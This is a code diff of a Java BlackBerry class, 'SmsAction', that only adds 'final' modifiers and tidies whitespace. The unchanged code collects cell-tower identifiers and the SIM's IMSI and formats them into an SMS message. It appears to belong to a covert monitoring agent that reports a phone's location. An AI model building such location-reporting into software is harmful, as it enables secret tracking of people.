@@ -80,35 +80,35 @@ public final class SmsAction extends SubAction {
         //#endif
         String message;
 
-        boolean gprs = true;
+        final boolean gprs = true;
         if (gprs) {
             // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
             // CC e MNC possono essere estratti da IMEI
             // http://en.wikipedia.org/wiki/Mobile_country_code
             // http://en.wikipedia.org/wiki/Mobile_Network_Code
-            GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
+            final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            int mcc = cellinfo.getMCC();
-            int mnc = cellinfo.getMNC();
-            int lac = cellinfo.getLAC();
-            int cid = cellinfo.getCellId();
+            final int mcc = cellinfo.getMCC();
+            final int mnc = cellinfo.getMNC();
+            final int lac = cellinfo.getLAC();
+            final int cid = cellinfo.getCellId();
 
-            int bsic = GPRSInfo.getCellInfo().getBSIC();
+            final int bsic = GPRSInfo.getCellInfo().getBSIC();
 
-            StringBuffer mb = new StringBuffer();
+            final StringBuffer mb = new StringBuffer();
             mb.append("MCC: " + Integer.toHexString(mcc));
             mb.append(" MNC: " + mnc);
             mb.append(" LAC: " + lac);
             mb.append(" CID: " + cid);
             message = mb.toString();
         } else {
-            CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
+            final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
 
-            int sid = cellinfo.getSID();
-            int nid = cellinfo.getNID();
-            int bid = cellinfo.getBID();
+            final int sid = cellinfo.getSID();
+            final int nid = cellinfo.getNID();
+            final int bid = cellinfo.getBID();
 
-            StringBuffer mb = new StringBuffer();
+            final StringBuffer mb = new StringBuffer();
             mb.append("SID" + sid);
             mb.append(" NID: " + nid);
             mb.append(" BID: " + bid);
@@ -187,7 +187,7 @@ public final class SmsAction extends SubAction {
                 // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                 break;
             case TYPE_SIM:
-                String imsi = Device.getInstance().getImsi();
+                final String imsi = Device.getInstance().getImsi();
                 text = "IMSI: " + imsi;
                 break;
             default:
@@ -205,12 +205,12 @@ public final class SmsAction extends SubAction {
         return true;
     }
 
-    public String toString(){
-        StringBuffer sb = new StringBuffer();
+    public String toString() {
+        final StringBuffer sb = new StringBuffer();
         sb.append("Sms type: " + type);
         sb.append(" number: " + number);
         sb.append(" text: " + text);
-        
+
         return sb.toString();
     }
 }
